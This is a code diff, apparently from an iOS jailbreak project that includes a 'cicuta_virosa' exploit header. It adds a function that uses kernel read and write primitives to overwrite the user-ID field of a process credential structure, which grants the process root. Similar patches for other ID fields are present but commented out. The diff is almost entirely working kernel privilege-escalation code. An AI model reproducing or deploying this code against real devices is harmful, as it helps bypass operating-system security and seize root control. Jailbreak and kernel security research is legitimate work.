@@ -11,12 +11,45 @@
 #include "../Libraries/System/libproc.h"
 #include "../Misc/support.h"
 #include "../Exploit/cicuta_virosa.h"
+#include "../Misc/kernel_offsets.h"
 #include "kernel_utils.h"
 #include "utils.h"
 #import <spawn.h>
 
 extern char **environ;
 NSData *lastSystemOutput=nil;
+
+int perform_root_patches(kptr_t ucred){
+    uint32_t buffer[5] = {0, 0, 0, 1, 0};
+    
+    /* CR_UID */
+    uint64_t old_uid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_UID);
+    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_UID, (void*)buffer);
+    uint64_t new_uid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_UID);
+    if(old_uid == new_uid) return 1;
+//
+//    /* CR_RUID */
+//    uint64_t old_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
+//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID, (void*)buffer);
+//    uint64_t new_ruid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_RUID);
+//    if(old_ruid == new_ruid) return 1;
+//
+//    /* CR_SVGID */
+//    uint64_t old_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
+//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID, (void*)buffer);
+//    uint64_t new_svgid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVGID);
+//    if(old_svgid == new_svgid) return 1;
+//
+//    /* CR_SVUID */
+//    uint64_t old_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
+//    write_20(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID, (void*)buffer);
+//    uint64_t new_svuid = read_64(ucred + KSTRUCT_OFFSET_UCRED_CR_SVUID);
+//    if(old_svuid == new_svuid) return 1;
+    
+    
+    
+    return 0;
+}
 
 bool set_csflags(kptr_t proc, uint32_t flags, bool value) {
     bool ret = false;
